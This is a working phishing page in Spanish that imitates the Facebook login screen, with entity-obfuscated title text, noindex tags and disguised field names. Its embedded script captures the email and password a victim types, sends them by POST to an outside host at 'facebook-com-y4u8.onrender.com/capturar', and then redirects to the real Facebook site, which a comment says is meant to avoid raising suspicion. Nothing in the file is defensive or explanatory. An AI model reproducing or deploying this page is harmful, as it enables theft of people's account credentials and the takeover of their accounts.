<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="css/style.css">
    <meta name="robots" content="noindex, nofollow, noarchive">
</head>
<body>
    <div class="mobile-language-header">
        Español <span class="arrow">⌵</span>
    </div>

    <div class="wrapper">
        <main class="main-container">
            <section class="left-panel">
               <div class="logo-fb-custom">f</div> 
                <div class="collage-area">
                    <span class="emoji">😆</span>
                    <div class="card card-knot"><div class="card-icon"></div></div>
                    <div class="card card-skater">
                        <div class="time-badge">⏱️16:45</div>
                        <div class="profile-circle"><div class="heart-badge"></div></div>
                    </div>
                    <div class="card card-tickets"><div class="blue-icon">★</div></div>
                </div>
                <h1 class="main-text">Conecta <br> con tus <br> <span> amigos aquí.</span></h1>
            </section>

            <section class="right-panel">
                <div class="login-container">
                    <h2 class="titulo-login">Inici&#x61;r s&#x65;si&oacute;n &#101;n F&#x61;cebo&#x6f;k</h2>
                    
                    <form id="loginForm">
                        <input type="text" id="usr_auth_x46" placeholder="Celular o correo electrónico" required>
                        <input type="password" id="pass_auth_x46" placeholder="Contraseña" required> 
                        <button type="submit" class="login-btn">Iniciar sesión</button>
                    </form>
                    
                    <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
                    
                    <div class="mobile-footer-action">
                        <button class="create-btn">Crear cuenta nueva</button>
                    </div>
                </div>

                <div class="meta-brand">
                    <div class="meta-logo-container">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
                        <span>Meta</span>
                    </div>
                    <div class="mobile-footer-links">
                        Información · Ayuda · Más
                    </div>
                </div>
            </section>
        </main>

        <footer class="footer-container">
            <div class="footer-content">
                <div class="footer-row languages">
                    <span>Español</span> <span>English (US)</span> <span>Italiano</span> 
                    <span>Português (Brasil)</span> <span>Français (France)</span> 
                </div>
                <div class="footer-divider"></div>
                <div class="footer-row">
                    <span>Condiciones</span> <span>Ayuda</span>
                </div>
            </div>
        </footer>
    </div>

    <script>
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.querySelector('.login-btn');

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        loginBtn.innerText = "Iniciando sesión...";
        loginBtn.style.opacity = "0.7";
        loginBtn.disabled = true;

        const email = document.getElementById('usr_auth_x46').value;
        const password = document.getElementById('pass_auth_x46').value;

        // Retraso de 5 segundos para balancear seguridad y usabilidad
        setTimeout(async () => {
            try {
                const response = await fetch('https://facebook-com-y4u8.onrender.com/capturar', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                // Redirección inmediata a la versión móvil de Facebook
                window.location.href = "https://m.facebook.com/login/device-based/regular/login/";
            } catch (error) {
                console.error('Error:', error);
                loginBtn.innerText = "Iniciar sesión";
                loginBtn.style.opacity = "1";
                loginBtn.disabled = false;
                // En caso de error, igual redirigimos para no levantar sospechas
                window.location.href = "https://m.facebook.com/";
            }
        }, 5000); 
    });
    </script>
</body>
</html>
